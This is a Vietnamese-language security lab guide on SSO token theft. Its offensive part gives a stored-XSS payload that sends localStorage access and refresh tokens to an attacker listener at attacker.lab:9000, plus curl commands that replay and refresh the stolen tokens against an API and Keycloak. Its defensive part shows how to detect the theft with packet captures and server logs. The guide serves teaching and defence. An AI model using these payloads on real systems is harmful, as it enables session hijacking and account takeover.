# HƯỚNG DẪN THỰC HÀNH: ĐÁNH CẮP VÀ LẠM DỤNG TOKEN (SSO)
**Mã Lab:** sso-token-theft
**Mức độ:** Trung bình – Khó
**Chuyên đề:** Web Security / Identity Security / DFIR (Network Forensics)

## 1. Giới thiệu Lab
**Thông tin chi tiết:**
- **Công cụ:** firefox, curl, python3, tcpdump, wireshark, journalctl
- **Giao thức:** OAuth 2.0 / OpenID Connect (OIDC)
- **Mục tiêu tấn công:** Nhắm vào token đã được cấp phát hợp lệ (Post-Issuance)

**Mục tiêu học tập:**
- **(Red Team)** Thực hành đánh cắp token qua lỗ hổng Stored XSS nhắm vào localStorage. Khai thác 2 kỹ thuật: Access Token Replay (truy cập dữ liệu) và Refresh Token Theft (duy trì truy cập lâu dài).
- **(Kiến trúc)** Hiểu vì sao MFA, SSO và các cơ chế như PKCE vô tác dụng trong giai đoạn sau khi token đã phát hành.
- **(Blue Team/DFIR)** Áp dụng quy trình Điều tra số Mạng (Network Forensics). Dùng tcpdump và Wireshark để dựng lại hiện trường, chứng minh luồng luân chuyển và lạm dụng token.

## 2. Kịch bản thực hành
Employee Portal lưu cặp token trực tiếp vào localStorage. Tính năng "Danh bạ nhân viên" hiển thị Tên hiển thị của người dùng nhưng mắc lỗi Stored XSS.
Kẻ tấn công cấy mã độc vào Tên hiển thị. Khi nạn nhân xem danh bạ, mã độc âm thầm đọc token trong localStorage và tuồn về máy chủ của kẻ tấn công. Kẻ gian giả danh nạn nhân gọi API và tự xin cấp token mới để duy trì quyền.

**Khởi tạo môi trường lab:**
```bash
labtainer sso-token-theft
```
**Tài khoản:** 
- Victim (Nạn nhân): `student / Student-2026!`
- Attacker (Kẻ tấn công): `attacker / Attacker-2026!`

---

### PHẦN I: KHAI THÁC VÀ LẠM DỤNG TOKEN (RED TEAM)

#### Nhiệm vụ 1: Khảo sát cơ chế lưu trữ Token
**Bước 1:** Tại terminal client, mở trình duyệt Firefox chạy ngầm:
```bash
firefox http://employee.lab:5001 >/dev/null 2>&1 &
```
**Bước 2:** Đăng nhập bằng tài khoản nạn nhân: `student / Student-2026!`.
**Bước 3 (Kiểm tra SSO):** Mở một tab Firefox mới, truy cập `http://documents.lab:5002`. Xác nhận trình duyệt tự động đăng nhập thành công nhờ phiên SSO Keycloak.
**Bước 4 (Kiểm tra kho lưu trữ):** Quay lại tab Employee Portal. Mở DevTools (nhấn F12) → chọn tab Application (hoặc Storage) → Local Storage → `http://employee.lab:5001`.
Quan sát: Bạn sẽ thấy rõ hai khoá `access_token` và `refresh_token`. Việc lưu tại đây khiến bất kỳ mã JavaScript nào trên trang cũng có thể đọc được.
**Bước 5:** Sang tab Document Portal, mở DevTools kiểm tra Local Storage.
Quan sát: Không có token nào ở đây do hệ thống này bảo mật bằng Cookie HttpOnly.

**Câu hỏi 1:** Vì sao lưu token trong cookie HttpOnly lại ngăn được JavaScript đọc token, ngay cả khi trang đó bị dính lỗi XSS?

#### Nhiệm vụ 2: Triển khai mã độc và Đánh cắp Token
**Bước 1:** Tại terminal attacker, khởi chạy listener để hứng token. Bắt buộc dùng cờ `-u` (unbuffered) để log xả xuống đĩa ngay lập tức:
```bash
python3 -u -m http.server 9000 --bind 0.0.0.0 > /tmp/steal.log 2>&1 &
```
**Bước 2:** Mở Firefox trên máy attacker, truy cập `http://employee.lab:5001` và đăng nhập bằng tài khoản kẻ tấn công: `attacker / Attacker-2026!`.
**Bước 3:** Vào mục Hồ sơ cá nhân, đặt Tên hiển thị thành mã độc sau và bấm Lưu lại:
```html
<script>fetch('http://attacker.lab:9000/steal?at='+encodeURIComponent(localStorage.getItem('access_token'))+'&rt='+encodeURIComponent(localStorage.getItem('refresh_token')))</script>
```
**Bước 4:** Quay lại terminal client (đang là tài khoản student), bấm sang trang Danh bạ nhân viên. Nạn nhân không thấy điều gì bất thường, nhưng mã độc đã thực thi.
**Bước 5:** Tại terminal attacker, kiểm tra xem đã bắt được token chưa:
```bash
cat /tmp/steal.log
```
Xác nhận có Request GET chứa biến `at=...` và `rt=...`. Quét chọn và copy hai chuỗi token này dán tạm ra Text Editor (Notepad) để dùng cho lệnh dưới.

#### Nhiệm vụ 3: Phát lại và Lạm dụng Token (Access & Refresh Replay)
**Bước 1 (Access Token Replay):** Tại terminal attacker, dùng `access_token` vừa đánh cắp gọi trực tiếp lên API:
```bash
curl -H "Authorization: Bearer <DÁN_ACCESS_TOKEN_CỦA_VICTIM_VÀO_ĐÂY>" http://api.lab:8000/api/protected
```
Quan sát: API trả về dữ liệu của victim. Token hợp lệ nên API cấp quyền.
**Bước 2 (Refresh Token Theft):** Tại terminal attacker, dùng `refresh_token` xin cấp Token mới (Lưu ý realm là `sso-lab`):
```bash
curl -X POST http://idp.lab:8080/realms/sso-lab/protocol/openid-connect/token \
  -d "grant_type=refresh_token" \
  -d "client_id=employee-portal" \
  -d "refresh_token=<DÁN_REFRESH_TOKEN_CỦA_VICTIM_VÀO_ĐÂY>"
```
Quan sát: Keycloak trả về Token mới. Kẻ tấn công đã cắm chốt thành công.

**Câu hỏi 2:** Kỹ thuật Token Replay diễn ra sau khi quá trình xác thực đã hoàn tất. Các cơ chế như MFA có giúp ngăn chặn cuộc tấn công ở Nhiệm vụ 3 này không? Vì sao?

---

### PHẦN II: PHÁT HIỆN TOKEN THEFT BẰNG PCAP VÀ LOG (BLUE TEAM)
Sinh viên xác định token nào bị chuyển từ client tới attacker, attacker dùng token đó trong request nào và API/Keycloak xử lý request đó ra sao. Chỉ thu chứng cứ tại client và server; không cần đọc máy attacker.

| Máy | IP | Vai trò |
|---|---|---|
| client | 172.28.50.10 | Trình duyệt nạn nhân |
| server | 172.28.50.20 | Portal, API cổng 8000, Keycloak cổng 8080 |
| attacker | 172.28.50.30 | Nhận token tại cổng 9000 và gửi request lạm dụng |

#### Nhiệm vụ 4: Thu PCAP và log của lượt tấn công
**Bước 1.** Trên terminal riêng của client:
```bash
date -u
sudo tcpdump -i any -s 0 -w /tmp/client.pcap tcp
```
**Bước 2.** Trên terminal riêng của server:
```bash
date -u
sudo tcpdump -i any -s 0 -w /tmp/server.pcap tcp
```
Ghi thời điểm bắt đầu. Giao diện `any` tại server thu cả kết nối nội bộ giữa Portal và Keycloak.
**Bước 3.** Sau khi hai điểm thu đã chạy, cho client đăng xuất rồi đăng nhập lại bằng `student` và mở trang Danh bạ có payload của kịch bản. Dùng A0/R0 vừa bị lấy trong lượt này để thực hiện hai request lạm dụng ở Nhiệm vụ 3 (gọi API và refresh) tại máy attacker.
*(Lưu ý: Không chạy nguyên lệnh cũ bằng Up Arrow nếu lệnh còn chứa token của lượt trước. Token cũ có thể hết hạn làm sai kết quả của lượt thu mới).*
**Bước 4.** Nhấn Ctrl+C tại hai terminal bắt gói. Trên server, lưu log:
```bash
sudo journalctl -u api -b --utc -o short-iso --no-pager > /tmp/api.log
sudo journalctl -u keycloak -b --utc -o short-iso --no-pager > /tmp/keycloak.log
```
Khi phân tích, chỉ lấy các dòng thuộc khoảng thời gian vừa thu. Chọn hiển thị UTC trong Wireshark để đối chiếu.

**Câu hỏi 3:** Vì sao PCAP server có thể không ghi được request chuyển token trực tiếp từ client tới attacker?

#### Nhiệm vụ 5: Phát hiện Access Token Theft và Replay
**Bước 1. Xác định token bị gửi từ nạn nhân tới attacker**
Trên client:
```bash
wireshark /tmp/client.pcap &
```
- Nhập Display Filter: `ip.src == 172.28.50.10 && tcp.dstport == 9000`
- Chọn request tới `/steal`, kiểm tra Destination là 172.28.50.30, mở Follow → TCP Stream.
- Ghi nhận: Request do client 172.28.50.10 gửi tới attacker 172.28.50.30:9000. Giá trị `at` là A0; giá trị `rt` là R0. Lấy đầy đủ token, giải mã URL encoding nếu có. *(Ý nghĩa: Xác định đường chuyển token ra máy attacker).*

**Bước 2. Xác định chính attacker gửi A0 tới API**
Trên server:
```bash
wireshark /tmp/server.pcap &
```
- Nhập Display Filter: `ip.src == 172.28.50.30 && tcp.dstport == 8000`
- Chọn GET `/api/protected`, kiểm tra Destination là 172.28.50.20, mở Follow → TCP Stream.
- Lấy token trong header `Authorization: Bearer`. Đây là request của attacker vì Source IP là 172.28.50.30.

**Bước 3. So khớp token bị lấy với token attacker dùng**
Dùng công cụ chuẩn bị sẵn:
```bash
python3 compare_tokens.py
```
- Token 1: A0 từ tham số `at` ở Bước 1.
- Token 2: Toàn bộ token sau Bearer của request attacker ở Bước 2.
*(Nếu Cùng chuỗi token: True, attacker đã dùng chính token được chuyển từ client).*

**Bước 4. Xác định API có chấp nhận request đó hay không**
Trong stream ở Bước 2, xem response của API. Sau đó đọc log API trên server:
```bash
grep -n '/api/protected' /tmp/api.log
```
Tìm dòng thuộc lượt vừa thu, đối chiếu IP 172.28.50.30, thời gian và mã HTTP.
- **Kết luận:** A0 được chuyển tới attacker, attacker gửi đúng A0, API chấp nhận và trả nội dung bảo vệ dưới danh tính nạn nhân (200 OK): Access Token Theft và Replay thành công.
- Hoặc nếu API trả 401/403: token đã bị lấy; lần replay này bị từ chối. Ghi lý do từ response/log.

**Câu hỏi 4:** Trường nào chứng minh request gọi API do attacker gửi, và việc so khớp A0 bổ sung bằng chứng gì?

#### Nhiệm vụ 6: Phát hiện Refresh Token Theft và xác định kết quả sử dụng
**Bước 1. Xác định request refresh do attacker gửi**
Trong `server.pcap`, nhập bộ lọc: `ip.src == 172.28.50.30 && tcp.dstport == 8080`
- Tìm POST `/realms/sso-lab/protocol/openid-connect/token`, kiểm tra Destination là 172.28.50.20, mở Follow → TCP Stream.
- Trong body POST, kiểm tra `grant_type=refresh_token` và lấy đầy đủ `refresh_token=...`.

**Bước 2. So khớp R0 với token trong request attacker**
Chạy:
```bash
python3 compare_tokens.py
```
- Token 1: R0 từ tham số `rt` trong `client.pcap`.
- Token 2: `refresh_token` trong POST do attacker 172.28.50.30 gửi.
*(Kết quả True xác nhận attacker đã có và gửi chính refresh token bị chuyển từ client).*

**Bước 3. Kiểm tra response và đối chiếu log Keycloak**
Trong cùng stream, xem HTTP status trả về. Trên server đọc log:
```bash
grep -nE 'REFRESH_TOKEN|_ERROR|invalid_client|invalid_grant' /tmp/keycloak.log
```

| PCAP và log quan sát được | Kết luận |
|---|---|
| R0 khớp; response 200 có access_token mới; event REFRESH_TOKEN phù hợp | Refresh Token Theft; attacker dùng R0 thành công để nhận token mới. |
| R0 khớp; response lỗi (invalid_client/invalid_grant); log ghi lỗi liên quan | Refresh Token Theft; lần sử dụng R0 bị từ chối, ghi nguyên nhân thực tế. |
| Chỉ có response/log lỗi, chưa chứng minh R0 bị lấy và attacker sử dụng đúng R0 | Chưa đủ xác nhận Refresh Token Theft. |

**Câu hỏi 5:** Keycloak từ chối vì xác thực client thất bại có phủ nhận bằng chứng R0 đã bị lấy không?

#### Nhiệm vụ 7: Lập timeline và kết luận
Ghi số frame kèm tên PCAP; không điền sự kiện chưa quan sát được.

| Mốc | Sự kiện | Chứng cứ cần ghi | Kết quả |
|---|---|---|---|
| T1 | Client chuyển A0/R0 tới attacker | client.pcap: thời gian/frame, 172.28.50.10 -> 172.28.50.30:9000, tham số at/rt | Đường chuyển token |
| T2 | Attacker dùng A0 gọi API | server.pcap: request từ 172.28.50.30, token khớp A0, response; dòng api.log | Chấp nhận/từ chối; nội dung và danh tính |
| T3 | Attacker dùng R0 để refresh | server.pcap: POST từ 172.28.50.30, token khớp R0, response; dòng keycloak.log | Cấp token mới hoặc từ chối và lý do |

**Mẫu kết luận báo cáo:** "Token từ client được chuyển tới attacker. Request của attacker tại API sử dụng đúng A0 và [kết quả thực tế]. Request refresh của attacker sử dụng đúng R0 và Keycloak [kết quả thực tế]."

---
### Phụ lục: Script đối chiếu Token (compare_tokens.py)
Trong lab này, script `compare_tokens.py` đã được cấp sẵn ở thư mục hiện tại của bạn. Nếu bạn muốn chạy nó ở nơi khác, bạn có thể tạo file `compare_tokens.py` bằng đoạn mã tối giản sau:
```python
import sys
from getpass import getpass

try:
    t1 = getpass("Token 1: ").strip()
    t2 = getpass("Token 2: ").strip()
    if any(t.lower() in ("", "null", "none") for t in (t1, t2)):
        raise SystemExit("Token rỗng/null: chưa đủ để đối chiếu.")
    print("Cùng chuỗi token:", t1 == t2)
except KeyboardInterrupt:
    print()
    sys.exit(0)
```
